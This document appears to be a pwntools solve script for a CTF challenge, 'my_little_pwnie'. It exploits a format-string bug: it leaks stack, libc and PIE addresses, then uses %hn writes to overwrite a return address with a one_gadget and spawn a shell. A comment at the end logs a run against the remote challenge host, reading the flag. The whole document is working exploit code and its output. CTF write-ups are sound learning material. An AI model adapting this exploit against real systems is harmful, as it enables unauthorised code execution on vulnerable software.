from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './my_little_pwnie'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "pwnie.zajebistyc.tf"
  PORT = 17003
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.sendline("%p,%16$p,%67$p")

r = s.recvuntil(",")[:-1]
stack_leak = int(r, 16)
r = s.recvuntil(",")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0x1b3707
one_gadget = libc_base + 0x4f3d5
r = s.recvuntil("\n")[:-1]
pie_leak = int(r, 16)
pie_base = pie_leak - 0x4a0

print "stack_leak =", hex(stack_leak)
print "libc_leak  =", hex(libc_leak)
print "libc_base  =", hex(libc_base)
print "pie_leak   =", hex(pie_leak)
print "pie_base   =", hex(pie_base)

index = 6
a0 = one_gadget&0xffff
a1 = (one_gadget>>16)&0xffff
a2 = (one_gadget>>32)&0xffff
a2 = ((a2-a1-1) % 0x10000) + 1
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-1) % 0x10000) + 1
buf = "%%%dc%%%d$hn" % (a0, index+5)
buf += "%%%dc%%%d$hn" % (a1, index+6)
buf += "%%%dc%%%d$hn" % (a2, index+7)
buf += "-"*(8-len(buf)%8)
buf += p64(stack_leak-8)
buf += p64(stack_leak-8+2)
buf += p64(stack_leak-8+4)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/OMH_2021_CTF/Pwn_My_Little_Pwnie/my_little_pwnie/for_players$ python solve.py r
[*] '/home/mito/CTF/OMH_2021_CTF/Pwn_My_Little_Pwnie/my_little_pwnie/for_players/my_little_pwnie'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwnie.zajebistyc.tf on port 17003: Done
stack_leak = 0x7ffdb3eaa1a0
libc_leak  = 0x7f57d3320707
libc_base  = 0x7f57d316d000
pie_leak   = 0x55a12c1dc4a0
pie_base   = 0x55a12c1dc000
[*] Switching to interactive mode
...
...
$ id
uid=65534 gid=65534 groups=65534
$ ls -l
total 16
-rwxr-xr-x 1 65534 65534 5528 Apr 16 19:13 baby_pwn
-rwxr-xr-x 1 65534 65534  356 May 15 15:02 entrypoint.sh
-rw-r--r-- 1 65534 65534   46 Apr 16 15:51 flag
$ cat flag
p4{AT_ENTRY,AT_PLATFORM?-y0u_mean_l1ke_ATDT?}
'''
